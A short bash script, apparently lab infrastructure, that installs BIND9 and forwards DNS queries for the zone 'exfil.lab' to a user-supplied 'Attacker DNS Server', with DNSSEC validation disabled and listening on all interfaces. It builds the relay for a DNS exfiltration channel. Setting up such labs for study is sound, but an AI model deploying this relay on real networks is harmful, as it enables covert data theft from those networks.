#!/bin/bash

# Ensure script is run with sudo
if [ "$EUID" -ne 0 ]; then
    echo "[!] Please run this script with sudo"
    exit 1
fi

echo "[*] Setting up DNS Forwarder..."

# Prompt for Attacker IP
read -p "Enter the IP address of the Attacker DNS Server: " ATTACKER_IP

# Install BIND9
apt update
apt install -y bind9

# Set up forwarding zone for exfil.lab
tee /etc/bind/named.conf.local > /dev/null <<EOF
zone "exfil.lab" {
    type forward;
    forwarders { ${ATTACKER_IP}; };
};
EOF

# Configure global options
tee /etc/bind/named.conf.options > /dev/null <<EOF
options {
    directory "/var/cache/bind";
    forwarders {
        8.8.8.8;
    };
    dnssec-validation no;
    auth-nxdomain no;
    listen-on { any; };
};
EOF

# Restart BIND9
systemctl restart bind9
echo "[+] DNS Forwarder ready. exfil.lab is routed to attacker at ${ATTACKER_IP}."
